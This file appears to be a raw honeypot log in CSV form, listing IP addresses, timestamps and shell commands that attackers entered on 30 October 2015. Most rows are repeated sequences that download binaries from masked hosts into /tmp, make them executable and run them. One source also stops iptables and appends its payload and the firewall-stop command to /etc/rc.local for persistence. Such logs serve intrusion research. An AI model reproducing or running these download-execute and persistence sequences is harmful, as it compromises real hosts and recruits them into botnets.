ip,timestamp,input
"222.186.34.75","2015-10-30 09:59:06","./googleudp"
"222.186.34.75","2015-10-30 09:59:10","exit"
"222.186.34.75","2015-10-30 10:03:44","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 10:03:48","cd /tmp"
"222.186.34.75","2015-10-30 10:03:52","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 10:03:56","./googleudp"
"222.186.34.75","2015-10-30 10:04:00","exit"
"222.186.34.75","2015-10-30 10:06:04","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 10:06:07","cd /tmp"
"222.186.34.75","2015-10-30 10:06:11","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 10:06:15","./googleudp"
"222.186.34.75","2015-10-30 10:06:19","exit"
"222.186.34.75","2015-10-30 10:07:32","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-30 10:07:35","cd /tmp"
"222.186.34.75","2015-10-30 10:07:39","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-30 10:07:43","./googlesyn"
"222.186.34.75","2015-10-30 10:07:47","exit"
"222.186.34.75","2015-10-30 10:08:57","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 10:09:15","cd /tmp"
"222.186.34.75","2015-10-30 10:09:15","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 10:09:16","./googleudp"
"222.186.34.75","2015-10-30 10:09:16","exit"
"222.186.34.75","2015-10-30 10:09:16","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-30 10:09:19","cd /tmp"
"222.186.34.75","2015-10-30 10:09:23","chmod 777 ./googlessd"
"222.186.34.75","2015-10-30 10:09:27","./googlessd"
"222.186.34.75","2015-10-30 10:09:31","exit"
"222.186.34.75","2015-10-30 10:11:21","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 10:11:25","cd /tmp"
"222.186.34.75","2015-10-30 10:11:31","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 10:12:02","./googleudp"
"222.186.34.75","2015-10-30 10:12:02","exit"
"222.186.34.75","2015-10-30 10:27:04","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 10:27:07","cd /tmp"
"222.186.34.75","2015-10-30 10:27:11","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 10:27:15","./googleudp"
"222.186.34.75","2015-10-30 10:27:19","exit"
"222.186.34.75","2015-10-30 11:07:15","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 11:07:19","cd /tmp"
"222.186.34.75","2015-10-30 11:07:23","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 11:07:27","./googleudp"
"222.186.34.75","2015-10-30 11:07:32","exit"
"222.186.34.75","2015-10-30 11:08:50","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 11:08:54","cd /tmp"
"222.186.34.75","2015-10-30 11:08:58","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 11:09:02","./googleudp"
"222.186.34.75","2015-10-30 11:09:06","exit"
"222.186.34.75","2015-10-30 11:54:49","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 11:54:52","cd /tmp"
"222.186.34.75","2015-10-30 11:54:56","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 11:55:00","./googleudp"
"222.186.34.75","2015-10-30 11:55:04","exit"
"222.186.34.75","2015-10-30 12:09:43","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 12:10:00","cd /tmp"
"222.186.34.75","2015-10-30 12:10:00","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 12:10:00","./googleudp"
"222.186.34.75","2015-10-30 12:10:00","exit"
"222.186.34.75","2015-10-30 12:10:00","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 12:10:04","cd /tmp"
"222.186.34.75","2015-10-30 12:10:08","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 12:10:12","./googleudp"
"222.186.34.75","2015-10-30 12:10:16","exit"
"222.186.34.75","2015-10-30 12:12:46","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-30 12:12:50","cd /tmp"
"222.186.34.75","2015-10-30 12:12:54","chmod 777 ./googleudp"
"222.186.34.75","2015-10-30 12:12:58","./googleudp"
"222.186.34.75","2015-10-30 12:13:02","exit"
"59.46.10.155","2015-10-30 13:17:25","service iptables stop"
"59.46.10.155","2015-10-30 13:17:29","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-30 13:17:54","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-30 13:17:54","/dev/null 2&gt"
"59.46.10.155","2015-10-30 13:17:54","&amp"
"59.46.10.155","2015-10-30 13:17:54","1 &amp"
"59.46.10.155","2015-10-30 13:17:57","chmod 0777 scmcc"
"59.46.10.155","2015-10-30 13:18:01","chmod u+x scmcc"
"59.46.10.155","2015-10-30 13:18:05","./scmcc &"
"59.46.10.155","2015-10-30 13:18:09","chmod u+x scmcc"
"59.46.10.155","2015-10-30 13:18:13","./scmcc &"
"59.46.10.155","2015-10-30 13:18:17","cd /tmp"
"59.46.10.155","2015-10-30 13:18:21","service iptables stop"
"59.46.10.155","2015-10-30 13:18:26","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-30 13:18:37","chmod 777 scmcc"
"59.46.10.155","2015-10-30 13:18:41","./164"
"59.46.10.155","2015-10-30 13:18:45","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-30 13:18:50","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-30 13:18:50","/dev/null 2&gt"
"59.46.10.155","2015-10-30 13:18:50","&amp"
"59.46.10.155","2015-10-30 13:18:50","1 &amp"
"59.46.10.155","2015-10-30 13:18:53","chmod 0777 scmcc"
"59.46.10.155","2015-10-30 13:18:57","chmod u+x scmcc"
"59.46.10.155","2015-10-30 13:19:01","./scmcc &"
"59.46.10.155","2015-10-30 13:19:05","chmod u+x dos6cc4"
"59.46.10.155","2015-10-30 13:19:09","./scmcc &"
"59.46.10.155","2015-10-30 13:19:13","cd /tmp"
"59.46.10.155","2015-10-30 13:19:18","echo \"cd  /tmp/\">>/etc/rc.local"
"59.46.10.155","2015-10-30 13:19:22","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-30 13:19:26","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-30 13:19:30","echo \"/etc/init.d/iptables stop\">>/etc/rc.local"
"189.108.74.242","2015-10-30 15:38:22","echo -n test"
"189.108.74.242","2015-10-30 15:41:47","echo -n test"
"222.186.34.75","2015-10-30 18:20:22","wget -O /tmp/googlesyn http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 18:20:26","cd /tmp"
"222.186.34.75","2015-10-30 18:20:30","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-30 18:20:34","./googlesyn"
"222.186.34.75","2015-10-30 18:20:38","exit"
"222.186.34.75","2015-10-30 18:30:49","wget -O /tmp/googlesyn http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 18:30:53","cd /tmp"
"222.186.34.75","2015-10-30 18:30:57","chmod 755 ./Control"
"222.186.34.75","2015-10-30 18:31:01","./Control"
"222.186.34.75","2015-10-30 18:50:10","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 18:50:15","chmod 777 /Control"
"222.186.34.75","2015-10-30 18:50:18","./Control"
"222.186.34.75","2015-10-30 19:07:46","service iptavles stop"
"222.186.34.75","2015-10-30 19:07:50","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 19:07:53","chmod +x Control"
"222.186.34.75","2015-10-30 19:07:57","./Control &"
"222.186.34.75","2015-10-30 19:23:52","service iptavles stop"
"222.186.34.75","2015-10-30 19:23:56","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 19:24:00","chmod +x Control"
"222.186.34.75","2015-10-30 19:24:04","./Control &"
"222.186.34.75","2015-10-30 20:06:57","service iptavles stop"
"222.186.34.75","2015-10-30 20:07:02","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 20:07:05","chmod +x Control"
"222.186.34.75","2015-10-30 20:07:09","./Control &"
"222.186.34.75","2015-10-30 20:12:56","service iptavles stop"
"222.186.34.75","2015-10-30 20:13:00","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 20:13:04","chmod +x Control"
"222.186.34.75","2015-10-30 20:13:08","./Control &"
"222.186.34.75","2015-10-30 20:17:10","service iptavles stop"
"222.186.34.75","2015-10-30 20:17:26","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 20:17:26","chmod +x Control"
"222.186.34.75","2015-10-30 20:17:26","./Control &"
"222.186.34.75","2015-10-30 20:17:26","service iptavles stop"
"222.186.34.75","2015-10-30 20:17:30","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 20:17:34","chmod +x Control"
"222.186.34.75","2015-10-30 20:17:38","./Control &"
"222.186.34.75","2015-10-30 20:51:02","service iptavles stop"
"222.186.34.75","2015-10-30 20:51:06","wget http://***.***.***.***/Control"
"222.186.34.75","2015-10-30 20:51:10","chmod +x Control"
